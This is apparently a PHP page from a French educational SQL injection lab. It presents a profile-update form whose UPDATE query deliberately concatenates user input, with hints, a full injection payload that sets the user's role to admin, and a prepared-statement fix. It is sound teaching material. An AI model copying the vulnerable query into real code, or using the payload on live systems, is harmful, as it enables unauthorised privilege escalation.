<?php
require_once 'config.php';

if (!isLoggedIn()) {
    redirect('login.php');
}

$db = getDB();
$success = '';
$error = '';
$query_displayed = '';

// Récupérer les infos actuelles de l'utilisateur
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$current_user = $stmt->fetch(PDO::FETCH_ASSOC);

// Traitement de la mise à jour du profil
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $new_email = $_POST['email'] ?? '';
    $new_username = $_POST['username'] ?? '';

    // VULNERABLE: Concaténation directe dans une requête UPDATE
    // Ne JAMAIS faire ça en production !
    $query = "UPDATE users SET email = '$new_email' WHERE username = '$new_username'";

    logQuery($query);

    try {
        $db->exec($query);
        $success = "Profil mis à jour avec succès !";

        if (DEBUG_MODE) {
            $query_displayed = $query;
        }

        // Rafraîchir les données de l'utilisateur
        $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$_SESSION['user_id']]);
        $current_user = $stmt->fetch(PDO::FETCH_ASSOC);

        // Mettre à jour la session si le rôle a changé
        $_SESSION['role'] = $current_user['role'];

    } catch (PDOException $e) {
        $error = showError("Erreur lors de la mise à jour", $e->getMessage());
        if (DEBUG_MODE) {
            $query_displayed = $query;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profil - SQL Injection Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1> Mon Profil</h1>
            <p class="subtitle">Scénario 3: Privilege Escalation</p>
        </header>

        <nav class="navigation">
            <a href="dashboard.php">Dashboard</a>
            <a href="search.php">Recherche</a>
            <a href="profile.php" class="active">Profil</a>
            <?php if (isAdmin()): ?>
                <a href="admin.php">Admin Panel</a>
            <?php endif; ?>
            <a href="logout.php">Déconnexion</a>
        </nav>

        <div class="content">

            <?php if ($success): ?>
                <div class="success">✅ <?php echo htmlspecialchars($success); ?></div>
            <?php endif; ?>

            <?php if ($error): ?>
                <?php echo $error; ?>
            <?php endif; ?>

            <?php if ($query_displayed): ?>
                <div class="debug">
                    <strong> Requête SQL exécutée:</strong>
                    <pre><?php echo htmlspecialchars($query_displayed); ?></pre>
                </div>
            <?php endif; ?>

            <!-- Infos actuelles -->
            <div class="card">
                <h2> Informations actuelles</h2>
                <table class="info-table">
                    <tr>
                        <th>Utilisateur</th>
                        <td><?php echo htmlspecialchars($current_user['username']); ?></td>
                    </tr>
                    <tr>
                        <th>Email</th>
                        <td><?php echo htmlspecialchars($current_user['email']); ?></td>
                    </tr>
                    <tr>
                        <th>Rôle</th>
                        <td>
                            <span class="badge badge-<?php echo $current_user['role']; ?>">
                                <?php echo htmlspecialchars($current_user['role']); ?>
                            </span>
                        </td>
                    </tr>
                </table>
            </div>

            <!-- Formulaire de mise à jour -->
            <div class="card">
                <h2> Modifier mon profil</h2>
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="username">Nom d'utilisateur</label>
                        <input
                            type="text"
                            id="username"
                            name="username"
                            value="<?php echo htmlspecialchars($current_user['username']); ?>"
                        >
                    </div>

                    <div class="form-group">
                        <label for="email">Email</label>
                        <input
                            type="text"
                            id="email"
                            name="email"
                            value="<?php echo htmlspecialchars($current_user['email']); ?>"
                        >
                    </div>

                    <button type="submit" class="btn btn-primary">Mettre à jour</button>
                </form>
            </div>

            <!-- Section hints -->
            <div class="card hints-section">
                <h3> Objectif</h3>
                <p>Modifier votre rôle de <strong>user</strong> à <strong>admin</strong> sans avoir les droits pour le faire</p>

                <details>
                    <summary>Indice 1: Structure de la requête</summary>
                    <p>La requête de mise à jour ressemble à:</p>
                    <pre>UPDATE users SET email = '[votre_email]' WHERE username = '[votre_username]'</pre>
                </details>

                <details>
                    <summary>Indice 2: Modifier d'autres colonnes</summary>
                    <p>En SQL, vous pouvez modifier plusieurs colonnes avec une seule requête UPDATE :</p>
                    <pre>UPDATE users SET email = 'test', role = 'admin' WHERE username = 'user'</pre>
                </details>

                <details>
                    <summary>Indice 3: Exploiter le champ email</summary>
                    <p>Le champ email est directement inséré dans la requête...</p>
                    <p>Que se passe-t-il si vous insérez une virgule et une nouvelle assignation dans ce champ ?</p>
                </details>

                <details>
                    <summary>💡 Solution complète</summary>
                    <div class="solution-box">
                        <p><strong>Dans le champ Email, tapez:</strong></p>
                        <pre>hacked@diable.lab', role = 'admin' WHERE username = 'user'--</pre>
                        <p><strong>Laissez le champ Username tel quel:</strong> <code>user</code></p>
                        <p><strong>Requête résultante:</strong></p>
                        <pre>UPDATE users SET email = 'hacked@diable.lab', role = 'admin' WHERE username = 'user'-- ' WHERE username = 'user'</pre>
                        <p>Le <code>--</code> commente le reste de la requête originale. Le rôle est mis à jour en même temps que l'email !</p>
                    </div>
                </details>
            </div>

            <!-- Section apprentissage -->
            <div class="card learning-section">
                <h2> Technique: UPDATE Injection</h2>
                <p>Cette technique exploite une requête UPDATE vulnérable pour modifier des colonnes non prévues.</p>

                <div class="code-example">
                    <h4>Code vulnérable:</h4>
                    <pre>$query = "UPDATE users SET email = '$new_email' WHERE username = '$new_username'";</pre>
                </div>

                <div class="code-example">
                    <h4>Payload dans le champ email:</h4>
                    <pre>hacked@diable.lab', role = 'admin' WHERE username = 'user'--</pre>
                </div>

                <div class="code-example">
                    <h4>Requête résultante:</h4>
                    <pre>UPDATE users SET email = 'hacked@diable.lab', role = 'admin' WHERE username = 'user'-- ' WHERE username = 'user'</pre>
                    <p class="explanation">↑ Le commentaire <code>--</code> neutralise le reste. Le rôle est changé !</p>
                </div>

                <h3> Comment corriger ?</h3>
                <div class="code-example correct">
                    <h4>Code sécurisé avec requêtes préparées:</h4>
                    <pre>$stmt = $db->prepare("UPDATE users SET email = ? WHERE username = ?");
$stmt->execute([$new_email, $new_username]);</pre>
                    <p class="explanation">Les paramètres sont échappés automatiquement — impossible d'injecter du SQL</p>
                </div>
            </div>
        </div>

        <footer>
            <p>Lab DIABLE v3.0 - DSI ISFA 2025-2026</p>
        </footer>
    </div>
</body>
</html>
